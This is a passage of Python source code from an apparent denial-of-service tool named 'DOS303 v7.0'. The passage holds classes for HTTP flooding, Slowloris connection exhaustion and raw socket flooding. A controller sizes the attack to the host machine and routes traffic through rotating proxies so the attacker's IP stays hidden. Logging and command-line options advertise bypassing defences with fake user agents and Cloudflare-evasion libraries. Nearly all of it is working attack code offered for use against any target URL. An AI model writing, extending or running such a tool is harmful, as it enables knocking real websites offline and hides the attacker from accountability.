                        self.proxy_manager.mark_dead(proxy)
                    await asyncio.sleep(random.uniform(0.001, 0.003))
                    continue

                if proxy is None or self.direct_mode:
                    delay = max(0.0005, random.gauss(0.001, 0.0005))
                else:
                    delay = max(0.0005, random.gauss(0.003, 0.001))
                await asyncio.sleep(delay)

            except (ConnectionResetError, ConnectionAbortedError):
                await asyncio.sleep(random.uniform(0.001, 0.003))
            except asyncio.TimeoutError:
                if proxy and not self.args.no_proxy and self.proxy_manager:
                    self.proxy_manager.mark_dead(proxy)
                await asyncio.sleep(random.uniform(0.001, 0.003))
            except Exception:
                await asyncio.sleep(random.uniform(0.001, 0.003))

    async def _monitor(self):
        last_count = 0
        while not self.stop_event.is_set():
            await asyncio.sleep(5)
            async with self.lock:
                current = self.requests_sent
            diff = current - last_count
            rps = diff / 5
            if diff > 0:
                logger.info(f"   📊 HTTP: {current:,} (+{diff}) | {rps:.1f}/sec")
            last_count = current

class SlowlorisAttack:
    def __init__(self, host, port, connections, stop_event, args):
        self.host = host
        self.port = port
        self.max_connections = min(connections, 5000)
        self.active_connections = 0
        self.total_created = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event
        self.args = args

    async def attack(self):
        logger.info(f"Slowloris - {self.max_connections} connections")
        initial = min(200, self.max_connections)
        for i in range(initial):
            asyncio.create_task(self._create_connection())
            await asyncio.sleep(0.02)

        while not self.stop_event.is_set():
            await asyncio.sleep(10)
            async with self.lock:
                active = self.active_connections
                total = self.total_created
            logger.info(f"   📊 Slowloris: {active} active | {total} total")
            if active < self.max_connections * 0.4:
                needed = min(100, self.max_connections - active)
                for i in range(needed):
                    asyncio.create_task(self._create_connection())
                    if i % 20 == 0:
                        await asyncio.sleep(0.02)

    async def _create_connection(self):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port),
                timeout=5
            )
            path = f"/{random.randint(1, 999999)}"
            headers = [
                f"Host: {self.host}",
                f"Content-Length: {random.randint(1000000, 10000000)}",
                f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}",
                f"User-Agent: {random.choice(['Mozilla/5.0', 'Chrome/120.0', 'Firefox/121.0'])}",
                f"Accept: text/html,*/*",
                f"Accept-Language: en-US,en;q=0.9",
                f"Accept-Encoding: gzip, deflate",
                f"Connection: keep-alive",
                f"Cache-Control: no-cache"
            ]
            request = f"GET {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()

            async with self.lock:
                self.active_connections += 1
                self.total_created += 1

            while not self.stop_event.is_set():
                try:
                    writer.write(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(15, 45))
                except (ConnectionResetError, BrokenPipeError, socket.error):
                    break
                except Exception:
                    break

            writer.close()
            await writer.wait_closed()
        except (ConnectionRefusedError, socket.timeout, asyncio.TimeoutError, OSError):
            pass
        except Exception:
            pass
        finally:
            async with self.lock:
                if self.active_connections > 0:
                    self.active_connections -= 1
            if not self.stop_event.is_set():
                asyncio.create_task(self._create_connection())

class SocketFloodAttack:
    def __init__(self, host, port, packet_rate, stop_event, args):
        self.host = host
        self.port = port
        self.packet_rate = min(packet_rate, 10000)
        self.packets_sent = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event
        self.args = args

    async def attack(self):
        logger.info(f"Socket Flood - {self.packet_rate}/sec")
        workers = min(50, max(5, self.packet_rate // 100))
        tasks = []
        for _ in range(workers):
            tasks.append(asyncio.create_task(self._worker()))
        tasks.append(asyncio.create_task(self._monitor()))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _worker(self):
        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.host, self.port),
                    timeout=3
                )
                for _ in range(random.randint(3, 10)):
                    size = random.choice([64, 128, 256, 512, 1024, 2048])
                    writer.write(b'X' * size)
                    await writer.drain()
                    async with self.lock:
                        self.packets_sent += 1
                    await asyncio.sleep(random.uniform(0.0005, 0.01))
                writer.close()
                await writer.wait_closed()
                await asyncio.sleep(random.uniform(0.005, 0.02))
            except (asyncio.TimeoutError, ConnectionRefusedError):
                await asyncio.sleep(random.uniform(0.02, 0.05))
            except Exception:
                await asyncio.sleep(random.uniform(0.02, 0.05))

    async def _monitor(self):
        last_count = 0
        while not self.stop_event.is_set():
            await asyncio.sleep(10)
            async with self.lock:
                current = self.packets_sent
            diff = current - last_count
            if diff > 0:
                logger.info(f"   📊 Socket: {current:,} packets (+{diff})")
            last_count = current

# ============================================
# MAIN CONTROLLER - OPTIMIZED SEQUENCE
# ============================================
class DOS303Controller:
    def __init__(self, args):
        self.args = args
        self.start_time = 0
        self.attacks = []
        self.stop_event = asyncio.Event()
        self.user_agent_manager = UserAgentManager()
        self.header_manager = HeaderManager()
        self.proxy_manager = None
        self.path_manager = PathManager()
        self.http_attack = None
        self.target_info = None
        self.capacity = None

    async def run_optimized_sequence(self):
        """اجرای ترتیب بهینه: Auto-Calibrate → Proxy → Target → Attack"""
        show_banner()
        logger.info("=" * 60)
        logger.info("🔥 DOS303 v7.0 - OPTIMIZED ATTACK SEQUENCE")
        logger.info("👑 Coded by: @iazmonmn")
        logger.info("📱 Telegram: https://t.me/iazmonmn")
        logger.info("=" * 60)
        
        # ==========================================
        # STEP 1: AUTO-CALIBRATE (First!)
        # ==========================================
        logger.info("")
        logger.info("📊 STEP 1/4: AUTO-CALIBRATION")
        logger.info("─" * 40)
        
        if self.args.workers or self.args.connections or self.args.rate:
            self.capacity = {
                'level': 5,
                'level_name': "Custom",
                'workers': self.args.workers or 500,
                'connections': self.args.connections or 1000,
                'packet_rate': self.args.rate or 2000,
                'proxy_workers': min(mp.cpu_count() * 8, 500)
            }
            logger.info(f"Using manual settings: workers={self.capacity['workers']}")
        else:
            analyzer = SystemAnalyzer()
            self.capacity = await analyzer.analyze()
        
        logger.info(f"   🎯 Level: {self.capacity['level']} - {self.capacity['level_name']}")
        logger.info(f"   👥 Workers for attack: {self.capacity['workers']:,}")
        logger.info(f"   🔗 Connections: {self.capacity['connections']:,}")
        logger.info(f"   📦 Packet rate: {self.capacity['packet_rate']:,}/sec")
        logger.info(f"   🚀 Proxy workers: {self.capacity['proxy_workers']:,}")
        
        # ==========================================
        # STEP 2: PROXY ANALYSIS (MAX POWER!)
        # ==========================================
        logger.info("")
        logger.info("🌐 STEP 2/4: PROXY ANALYSIS (MAXIMUM POWER)")
        logger.info("─" * 40)
        
        if self.args.no_proxy:
            logger.warning("⚠️  NO-PROXY MODE ENABLED: Your IP will be exposed!")
            self.proxy_manager = None
        else:
            self.proxy_manager = ProxyManager(max_proxies=2000)
            # Use maximum workers for proxy scanning
            proxy_workers = self.capacity.get('proxy_workers', min(mp.cpu_count() * 8, 500))
            count = self.proxy_manager.load_proxies(max_workers=proxy_workers)
            
            if count == 0:
                logger.error("❌ No proxies found! Falling back to no-proxy mode.")
                self.proxy_manager = None
            else:
                logger.info(f"✅ Proxy analysis complete: {count} proxies ready")
                self.proxy_manager.start_background_refresh()
                logger.info("[*] Background proxy refresh started (every 30s)")
        
        # ==========================================
        # STEP 3: TARGET ANALYSIS
        # ==========================================
        logger.info("")
        logger.info("🎯 STEP 3/4: TARGET ANALYSIS")
        logger.info("─" * 40)
        
        target = self.args.target if self.args.target else self._get_target()
        if not target:
            logger.error("❌ No target provided!")
            return
        
        self.target_info = await TargetAnalyzer.analyze(target, self.proxy_manager)
        target = self.target_info['target']
        host = self.target_info['host']
        port = self.target_info['port']
        
        # ==========================================
        # STEP 4: ATTACK
        # ==========================================
        logger.info("")
        logger.info("⚔️ STEP 4/4: LAUNCHING ATTACK")
        logger.info("─" * 40)
        logger.info(f"🎯 Target: {target}")
        logger.info(f"👥 Workers: {self.capacity['workers']:,}")
        logger.info(f"🛡️  Bypass: User-Agent(fake) + Proxy Chain + Path({len(self.path_manager.paths)})")
        logger.info(f"📚  Libs: httpx={not self.args.no_httpx}, cloudscraper={not self.args.no_cloudscraper}, curl_cffi={not self.args.no_curl_cffi}")
        logger.info("=" * 60)
        
        # Create attacks
        self.http_attack = HTTPFloodAttack(
            target, self.capacity['workers'],
            self.proxy_manager, self.user_agent_manager,
            self.header_manager, self.path_manager,
            self.stop_event, self.args
        )
        self.attacks.append(self.http_attack)
        
        if not self.args.no_slowloris:
            slowloris = SlowlorisAttack(host, port, self.capacity['connections'], self.stop_event, self.args)
            self.attacks.append(slowloris)
        
        if not self.args.no_socket:
            socket_attack = SocketFloodAttack(host, port, self.capacity['packet_rate'], self.stop_event, self.args)
            self.attacks.append(socket_attack)
        
        self.start_time = time.time()
        
        # Signal handlers
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self._stop()))
            except NotImplementedError:
                pass
        
        # Start all attacks
        tasks = []
        for attack in self.attacks:
            tasks.append(asyncio.create_task(attack.attack()))
        tasks.append(asyncio.create_task(self._global_monitor()))
        
        logger.info("✅ All attacks started!")
        logger.info("⏰ Running... (Ctrl+C to stop)")
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _stop(self):
        logger.warning("⚠️ Stopping gracefully...")
        if self.proxy_manager:
            self.proxy_manager.stop()
        self.stop_event.set()
    
    def _get_target(self):
        target = input(Fore.CYAN + "Enter target URL: " + Style.RESET_ALL).strip()
        if not target:
            return None
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        return target
    
    async def _global_monitor(self):
        iteration = 0
        while not self.stop_event.is_set():
            await asyncio.sleep(10)
            iteration += 1
            elapsed = time.time() - self.start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            if self.proxy_manager:
                proxy_count = self.proxy_manager.get_proxy_count()
                logger.info(f"🌐 Proxies: {proxy_count} active")
            else:
                logger.info("🌐 Proxies: DISABLED")
            
            logger.info("=" * 50)
            logger.info(f"📊 ATTACK STATS - Round {iteration}")
            logger.info(f"⏱️  Time: {hours:02d}:{minutes:02d}:{seconds:02d}")
            
            total_req = 0
            for attack in self.attacks:
                if isinstance(attack, HTTPFloodAttack):
                    async with attack.lock:
                        req = attack.requests_sent
                    logger.info(f"✅ HTTP Requests: {req:,}")
                    total_req += req
                elif isinstance(attack, SlowlorisAttack):
                    async with attack.lock:
                        active_conn = attack.active_connections
                    logger.info(f"✅ Slowloris Active: {active_conn:,}")
                elif isinstance(attack, SocketFloodAttack):
                    async with attack.lock:
                        packets = attack.packets_sent
                    logger.info(f"✅ Socket Packets: {packets:,}")
                    total_req += packets
            
            rate = total_req / elapsed if elapsed > 0 else 0
            logger.info(f"📈 Total: {total_req:,} | Rate: {rate:.1f}/sec")
            logger.info("=" * 50)
    
    async def start(self):
        try:
            await self.run_optimized_sequence()
        except KeyboardInterrupt:
            logger.warning("⚠️ Attack stopped by user")
        except Exception as e:
            logger.error(f"💥 Fatal error: {str(e)[:60]}")
            import traceback
            traceback.print_exc()
        finally:
            self.stop_event.set()
            if self.http_attack and hasattr(self.http_attack, 'session'):
                await self.http_attack.session.close()
            if self.http_attack and hasattr(self.http_attack, 'httpx_client') and self.http_attack.httpx_client:
                await self.http_attack.httpx_client.aclose()
            if self.proxy_manager:
                self.proxy_manager.stop()
            logger.info("=" * 50)
            logger.info("👑 DOS303 v7.0 - Coded by @iazmonmn")
            logger.info("📱 Telegram: https://t.me/iazmonmn")
            logger.info("=" * 50)
            logger.info("👋 DOS303 finished")

# ============================================
# COMMAND LINE ARGUMENTS
# ============================================
def parse_args():
    parser = argparse.ArgumentParser(description='DOS303 v7.0 - Optimized Attack Sequence')
    parser.add_argument('target', nargs='?', help='Target URL (e.g., http://example.com)')
    parser.add_argument('--workers', type=int, help='Number of HTTP workers (default: auto)')
    parser.add_argument('--connections', type=int, help='Max Slowloris connections (default: auto)')
    parser.add_argument('--rate', type=int, help='Packet rate for socket flood (default: auto)')
    parser.add_argument('--max-workers', type=int, default=2000, help='Maximum workers cap (default: 2000)')
    parser.add_argument('--no-slowloris', action='store_true', help='Disable Slowloris attack')
    parser.add_argument('--no-socket', action='store_true', help='Disable Socket flood attack')
    parser.add_argument('--no-health', action='store_true', help='Disable health checks')
    parser.add_argument('--no-scan', action='store_true', help='Disable initial target scan')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy (exposes your IP!)')
    parser.add_argument('--no-httpx', action='store_true', help='Disable httpx (HTTP/2) transport')
    parser.add_argument('--no-cloudscraper', action='store_true', help='Disable cloudscraper (Cloudflare bypass)')
    parser.add_argument('--no-curl-cffi', action='store_true', help='Disable curl_cffi impersonation')
    return parser.parse_args()

# ============================================
# MAIN
# ============================================
async def main():
    args = parse_args()
    controller = DOS303Controller(args)
    await controller.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "⚠️ Exiting..." + Style.RESET_ALL)
    except Exception as e:
        print("\n" + Fore.RED + f"💥 Fatal: {e}" + Style.RESET_ALL)
